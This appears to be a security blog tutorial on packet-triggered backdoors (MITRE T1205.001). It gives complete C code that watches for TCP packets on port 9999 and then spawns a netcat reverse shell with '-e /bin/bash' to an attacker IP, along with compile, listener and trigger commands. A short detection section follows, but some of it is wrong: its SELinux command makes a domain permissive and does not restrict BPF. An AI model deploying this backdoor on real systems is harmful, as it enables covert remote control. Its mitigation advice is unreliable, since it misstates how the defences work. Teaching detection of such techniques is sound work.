---
title: Traffic Signaling:- Socket Filters in C2
category: Persistence
tags: [Traffic Signaling (T1205.001)]
---

Socket filters provide a mechanism at the kernel level for filtering, managing, and controlling network traffic. By using these filters, network administrators, security software, and even adversaries can craft controlled network communication pathways by selectively allowing or blocking traffic based on specific criteria.

Socket filters operate by attaching filters—typically using the **Berkeley Packet Filter (BPF)**—to network sockets. This enables the system to inspect, modify, and selectively process data packets as they flow through. With this setup, socket filters can analyze packet headers, payloads, and metadata, enabling decisions based on factors like IP addresses, port numbers, and protocols.

## Socket Filters for Backdoor Activation
#### **Initial Compromise and Filter Setup**

Once an adversary compromises a system, they may seek to maintain persistence through a covert backdoor or C&C channel. To do this, they can attach a custom socket filter to the network interface using tools like **libpcap** or **Winpcap** (Windows), or by directly using **setsockopt** with the **SO_ATTACH_FILTER** option. This socket filter allows the adversary to selectively monitor and intercept network traffic to and from the compromised system.

***Example:*** an adversary may install a filter on **eth0** (the primary network interface) to monitor TCP traffic on a specific port (e.g. 9999), which they’ll later use to communicate with a reverse shell or to send commands.

**libpcap-dev installation**
   `sudo apt install libpcap-dev`
This program will now capture TCP packets on port 9999 and print a message when it detects a match. Upon detecting the packet, it will trigger the reverse shell activation by connecting to the attacker

    #include <pcap.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    // Declare the packet handler function before main
    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet);
    
    int main() {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle;
    
        // Open the network interface for packet capture (adjust interface name)
        handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf); // Adjust the interface name
        if (handle == NULL) {
            fprintf(stderr, "Error opening device: %s\n", errbuf);
            return 1;
        }
    
        // Set a filter for TCP traffic on port 9999 (reverse shell port)
        struct bpf_program fp;
        char filter_exp[] = "tcp port 9999";  // Port for reverse shell
        if (pcap_compile(handle, &fp, filter_exp, 0, PCAP_NETMASK_UNKNOWN) == -1) {
            fprintf(stderr, "Error compiling filter\n");
            return 1;
        }
        if (pcap_setfilter(handle, &fp) == -1) {
            fprintf(stderr, "Error setting filter\n");
            return 1;
        }
    
        // Start capturing packets, invoking the packet handler on each match
        printf("Listening for traffic on port 9999...\n");
        pcap_loop(handle, 0, packet_handler, NULL);
    
        // Close the capture handle after the loop finishes
        pcap_close(handle);
        return 0;
    }
    
    // Define the packet handler function
    void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
        // Print out some basic info about the captured packet
        printf("Captured a packet matching the filter!\n");
        printf("Packet Length: %d bytes\n", pkthdr->len);
    
        // Simulate reverse shell activation (spawning a shell)
        printf("Initiating reverse shell...\n");
    
        // Execute reverse shell: Connect back to attacker (adjust the IP address)
        if (fork() == 0) {
            execlp("/bin/bash", "bash", "-i", "-c", "nc 192.168.10.73 9999 -e /bin/bash", (char *)NULL);
            exit(0);
        }
    }



**Compile the program**
   `gcc -o packet_capture packet_capture.c -lpcap`

**Run the program**
   `sudo ./packet_capture`

![Packet Filter & capture](/assets/img/socket-filters/packet_capture.png)
#### **2. Sending Crafted Packets to Trigger Reverse Shell**

The attacker needs to listen for incoming reverse shell connections and send a packet to the victim to trigger the filter.


**Set up the Reverse Shell Listener on adversary**
   `nc -lvnp 9999`

This will listen on port 9999 for incoming connections, allowing the attacker to receive the reverse shell once it's triggered.


***Send a Packet to Trigger the Filter on victim machine***
`echo "Test" | nc -w 1 victim-ip 9999` 

![Packet Filter & capture](/assets/img/socket-filters/shell.png)



The attacker needs to send a packet to the victim's machine that matches the BPF filter. Use Netcat to send a simple packet.This packet will match the filter.

This simulation demonstrates how an attacker can use packet filters to trigger a reverse shell without needing to maintain an active connection. By understanding how packet filters work and how they can be leveraged by adversaries, security professionals can better detect and prevent such attacks. The use of packet filters to monitor specific ports can be an effective persistence mechanism for attackers, which makes detecting these activities crucial for securing systems.

#### **3. Triggering Command Shell or Implant Installation**

In this example, the filter could be used to trigger additional actions, such as:

-   **Installing a backdoor** or **implant** on the system.
-   **Command and control (C&C)**: Using the reverse shell to send further commands, enabling remote manipulation of the system.

The filter could be crafted to not just passively monitor traffic but to activate certain system features when certain types of packets are detected. This makes the attack highly stealthy, as there is minimal traffic to attract attention, and the filter's actions are only triggered under specific conditions.

#### **4. Evasion and Low Detection Risk**

Since the socket filter is designed to operate with minimal system overhead, its activity is difficult to detect. It is typically lightweight and does not involve complex processes that could raise suspicion. Additionally, because the socket connection is not activated until the filter receives a matching packet, there is limited activity on the host, making it hard to identify the attack.

The lack of visible network activity and the use of low-overhead socket operations mean that traditional network monitoring tools or IDS systems that rely on frequent traffic inspection may fail to detect the exfiltration or reverse shell activation.

### **Detection and Mitigation**


#### **A. Monitoring and Auditing Network Interfaces**

To detect the use of socket filters for covert backdoor activations, network administrators can monitor for suspicious BPF programs or unusual socket activity. Tools like **bpftool** can list active BPF programs attached to network interfaces, which can help identify abnormal or unauthorized filters.

**Check for BPF programs attached to network interfaces**


`sudo bpftool prog show` 

This can identify any filters that have been installed on the system, such as those attached to port 9999 for reverse shell activation.

#### **B. Inspecting Network Traffic**

Adversary-driven packet filters often utilize hidden or non-standard ports for command and control. By analyzing network traffic for deviations from normal patterns—such as traffic on uncommon ports or with unusual packet characteristics—defenders can identify potential exfiltration or C&C activity.

For example, using **tcpdump** to capture traffic on port 9999 can help detect attempts to trigger backdoors or implants.

_**Capturing traffic on port 9999**_


`sudo tcpdump -i eth0 port 9999` 

#### **C. Kernel Auditing and System Integrity Checks**

Monitoring the integrity of the system kernel can help detect unauthorized filter installation. Using kernel auditing tools like **auditd** and monitoring for the loading of suspicious BPF programs or network-related system calls can provide early warning signs of an attack.

#### **D. Restricting Socket Filter Usage**

Restricting access to the ability to attach socket filters can help prevent adversaries from deploying them. Using system hardening techniques, such as configuring **SELinux** or **AppArmor**, can limit access to the relevant system calls or BPF functionalities.

_**SELinux policy to restrict BPF program usage**_


`semanage permissive -a bpfilter_t` 


### **Conclusion**

The use of socket filters for covert backdoor activation and command and control is a powerful evasion technique used by adversaries. By exploiting _**libpcap**_ or _**Winpcap**_, attackers can create custom filters that monitor specific traffic and trigger malicious actions, such as reverse shells or implant installations, when certain criteria are met. Defenders must be vigilant in monitoring network interfaces, analyzing traffic patterns, and implementing security measures to detect and mitigate such attacks before they can cause damage.